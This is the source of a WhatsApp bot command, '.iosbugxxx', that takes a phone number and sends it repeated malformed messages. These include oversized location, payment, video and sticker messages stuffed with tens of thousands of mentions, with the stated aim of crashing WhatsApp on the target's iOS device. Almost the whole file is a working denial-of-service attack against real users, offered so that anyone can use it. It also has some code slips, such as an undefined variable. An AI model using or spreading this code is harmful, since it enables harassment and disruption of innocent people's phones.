let handler = async (m, { conn, text }) => {
  if (!text) return m.reply('𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .iosbugxxx <number> 🎗');

  const targetId = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  const doneios = `
*\`ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮͢𝐭𝐢𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠\`*🩸🐍
⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId}
⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp iOS
⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Succesfully
  `.trim();

  const glxNull = {
    key: {
      remoteJid: 'status@broadcast',
      fromMe: false,
      participant: '1@s.whatsapp.net'
    },
    message: {
      interactiveResponseMessage: {
        body: {
          text: '𝐏𝐇𝐎𝐍𝐈𝐗 𝐆𝐄𝐍 𝟐',
          format: 'DEFAULT',
          caption: 'ʙʏ ʀᴀʟᴅᴢᴢ'
        },
        nativeFlowResponseMessage: {
          name: 'galaxy_message',
          paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"PhynxAgency\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"raldzzxyzz@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`
        }
      }
    }
  };

  try {
    await conn.sendMessage(m.chat, {
      image: { url: 'https://files.catbox.moe/w1isit.jpg' },
      caption: doneios,
      footer: '</> 𝘱𝘭𝘦𝘢𝘴𝘦 𝘱𝘢𝘶𝘴𝘦 𝘧𝘰𝘳 5 𝘮𝘪𝘯𝘶𝘵𝘦𝘴 𝘴𝘰 𝘵𝘩𝘢𝘵 𝘵𝘩𝘦 𝘣𝘰𝘵 𝘪𝘴 𝘯𝘰𝘵 𝘣𝘢𝘯𝘯𝘦𝘥',
      buttons: [
        {
          buttonId: '#',
          buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' },
          type: 1
        }
      ],
      contextInfo: {
        externalAdReply: {
          title: '𝐏𝐡𝐨𝐧𝐢𝐱 𝐂𝐫𝐚𝐬𝐡𝐞𝐫',
          body: 'sᴜᴄᴄᴇsғᴜʟʟʏ ʙᴜɢ ɪᴏs',
          thumbnailUrl: 'https://files.catbox.moe/w1isit.jpg',
          sourceUrl: 'https://youtube.com/@raldzzoffc',
          mediaType: 1,
          renderLargerThumbnail: true
        }
      },
      headerType: 4,
      viewOnce: true
    }, { quoted: glxNull });

    for (let i = 0; i < 25; i++) {
      await ios1(targetId);
      await ios2(targetId);
    }

    for (let i = 0; i < 25; i++) {
      await protocolbug3(targetId, true);
      await bulldozer(targetId);
    }

  } catch (error) {
    console.error('Error al enviar bug:', error);
    m.reply('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗');
  }
};

handler.command = ["iosbugxxx"];
handler.help = ["iosbugxxx <number>"];
handler.tags = ["bug"];
handler.premium = false; // ✅ Ahora puede usarlo cualquiera
export default handler;

// 🔽 Funciones incluidas:

async function ios1(target) {
  let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(90000);
  await conn.relayMessage(
    jid,
    {
      locationMessage: {
        degreesLatitude: 999.99999999999999,
        degreesLongitude: -999.99999999999999,
        name: CrashQAiphone,
        url: "https://youtube.com/@raldzzoffc",
      },
    },
    {
      participant: {
        jid: target
      },
    }
  );
}

async function ios2(target) {
  await conn.relayMessage(target, {
    paymentInviteMessage: {
      serviceType: "CASHAPP",
      expiryTimestamp: Date.now() + 1814400000
    }
  }, {
    participant: {
      jid: target
    }
  });
}

async function protocolbug3(target, mention) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "109951162777600",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "\u9999",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375.enc",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: [
              ...Array.from({ length: 30000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ]
          },
        }
      }
    }
  }, {});

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  if (mention) {
    await conn.relayMessage(target, {
      groupStatusMentionMessage: {
        message: { protocolMessage: { key: msg.key, type: 25 } }
      }
    }, {
      additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
    });
  }
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000.enc",
          fileLength: { low: 1, high: 99999, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, message, {});
  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });
}